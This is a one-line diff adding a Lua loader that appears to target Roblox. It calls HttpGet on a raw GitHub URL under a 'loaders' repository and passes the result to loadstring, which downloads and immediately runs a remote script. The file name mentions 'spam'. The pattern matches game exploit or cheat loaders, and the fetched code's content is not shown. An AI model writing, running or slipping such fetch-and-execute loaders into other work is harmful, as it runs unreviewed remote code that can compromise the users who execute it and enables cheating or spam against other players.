@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam5-iincuahpmb9rri.lua"))()
